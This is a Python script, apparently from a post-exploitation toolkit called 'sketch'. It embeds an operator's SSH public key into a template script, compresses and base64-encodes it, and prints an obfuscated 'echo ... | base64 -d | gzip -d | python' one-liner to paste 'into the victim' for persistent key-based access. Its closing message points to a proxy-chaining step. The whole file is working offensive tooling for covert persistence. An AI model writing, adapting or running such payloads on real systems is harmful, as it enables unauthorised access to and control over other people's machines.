#!/usr/bin/env python3

import os
import sys
import base64
import io
import gzip
import re
import tempfile

logging = True


def usage():
    print("usage: %s <ssh public key path>" % sys.argv[0])
    sys.exit(1)


def templify(template, replacements):
    out = template
    for k, v in replacements.items():
        out = out.replace(k, v)
    return out


def gzbase(stuff):
    out = io.BytesIO()
    with gzip.GzipFile(fileobj=out, mode="wb") as f:
        parsed = nocomments(stuff)
        f.write(parsed.encode("ascii"))
    return base64.b64encode(out.getvalue())


def getfile(path):
    with open(path, "r") as f:
        return f.read()
    return None


def nocomments(stuff):
    nc = re.sub('#.*$', '', stuff, 0, re.M)
    o = ""
    for l in nc.splitlines(True):
        if l.strip():
            if not logging and "log" in l:
                continue
            o += l
    return o


def main():
    if len(sys.argv) < 2:
        usage()

    KEYPATH = sys.argv[1]

    print("[*] SSH Key path: %s" % KEYPATH)

    SCRIPT_TEMPLATE = getfile(os.path.join(sys.path[0], "provision_sketch.py"))
    print("[*] keypath: %s" % KEYPATH)

    pubkeyBytes = getfile(KEYPATH).encode("ascii")
    pubkey = base64.b64encode(pubkeyBytes)
    pubkey = pubkey.decode("ascii")

    replacements = {
        "PUBLIC_KEY_PLACEHOLDER": pubkey
    }

    SCRIPT = templify(SCRIPT_TEMPLATE, replacements)
    gzbased = gzbase(SCRIPT)
    cmd = "echo %s | base64 -d | gzip -d | python" % gzbased.decode("ascii")
    print("[+] paste the following into the victim as the user to install the keys to")
    print(cmd)
    f = tempfile.NamedTemporaryFile(delete=False)
    f.write(cmd.encode("ascii"))
    print("[+] This is also available to you in the file %s" % f.name)
    print("[*] Once this commmand is ran on sketch as the user to install the keys to, run install_proxy.py <Proxyport> <Middle> <Edge> <User> <Key>")


if __name__ == "__main__":
    main()
